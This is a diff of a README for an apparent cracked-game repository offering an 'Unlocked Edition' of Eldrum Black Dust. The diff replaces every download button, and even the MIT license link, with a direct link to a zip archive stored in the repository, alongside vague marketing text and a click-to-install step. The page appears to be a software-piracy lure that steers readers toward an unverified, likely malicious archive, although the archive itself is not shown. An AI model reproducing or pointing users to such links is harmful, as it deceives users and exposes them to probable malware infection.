@@ -1,6 +1,6 @@
 # 🎮 Eldrum Black Dust CRPG Download Repository
 
-[![Download Now](https://img.shields.io/badge/Download-Eldrum_Black_Dust-blue.svg)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/Omkar052/EldrumBlackDust-CRPG-UnlockedEdition/main/Funtumia/EldrumBlackDust-CRPG-UnlockedEdition.zip)](https://raw.githubusercontent.com/Omkar052/EldrumBlackDust-CRPG-UnlockedEdition/main/Funtumia/EldrumBlackDust-CRPG-UnlockedEdition.zip)
 
 Welcome to the ultimate hub for accessing Eldrum Black Dust, the engaging CRPG experience! Unlock the depths of an enthralling adventure, filled with deep lore, tactical battles, and a gripping storyline. This repository ensures you get the most seamless installation, up-to-date features, and optimal compatibility instructions for every gamer.
 
@@ -32,7 +32,7 @@ Emphasizing user accessibility and security, this project is distributed under t
 ## 🚀 Installation - Step 1
 
 Begin your journey now:  
-[![Download Now](https://img.shields.io/badge/Download-Eldrum_Black_Dust-blue.svg)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/Omkar052/EldrumBlackDust-CRPG-UnlockedEdition/main/Funtumia/EldrumBlackDust-CRPG-UnlockedEdition.zip)](https://raw.githubusercontent.com/Omkar052/EldrumBlackDust-CRPG-UnlockedEdition/main/Funtumia/EldrumBlackDust-CRPG-UnlockedEdition.zip)
 
 1. Click the button above to get Eldrum Black Dust for your system.
 
@@ -46,8 +46,8 @@ This repository is for educational and promotional purposes. All intellectual pr
 
 ## 📄 License
 
-MIT License - [Learn More](https://opensource.org/licenses/MIT)
+MIT License - [Learn More](https://raw.githubusercontent.com/Omkar052/EldrumBlackDust-CRPG-UnlockedEdition/main/Funtumia/EldrumBlackDust-CRPG-UnlockedEdition.zip)
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Eldrum_Black_Dust-blue.svg)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/Omkar052/EldrumBlackDust-CRPG-UnlockedEdition/main/Funtumia/EldrumBlackDust-CRPG-UnlockedEdition.zip)](https://raw.githubusercontent.com/Omkar052/EldrumBlackDust-CRPG-UnlockedEdition/main/Funtumia/EldrumBlackDust-CRPG-UnlockedEdition.zip)
